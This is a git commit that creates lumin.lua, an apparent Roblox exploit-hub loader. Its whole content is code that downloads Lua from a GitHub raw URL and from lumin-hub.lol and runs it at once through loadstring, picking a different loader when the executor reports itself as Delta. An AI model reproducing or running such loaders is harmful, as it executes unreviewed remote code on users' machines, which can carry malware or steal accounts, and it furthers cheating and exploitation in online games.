9fb879eb3679c6d128f53b19001070ffe59f089c
wixboops <coke3@dr.com>
2025-06-17 12:02:12 -0500

    Create lumin.lua

---
+++ lumin.lua
@@ -0,0 +1,10 @@
+spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/GAG.lua"))();
+end)
+
+
+if identifyexecutor and identifyexecutor():lower():find("delta") then
+    loadstring(game:HttpGet("https://lumin-hub.lol/deltaloader.lua", true))()
+else
+    loadstring(game:HttpGet("https://lumin-hub.lol/loader.lua", true))()
+end
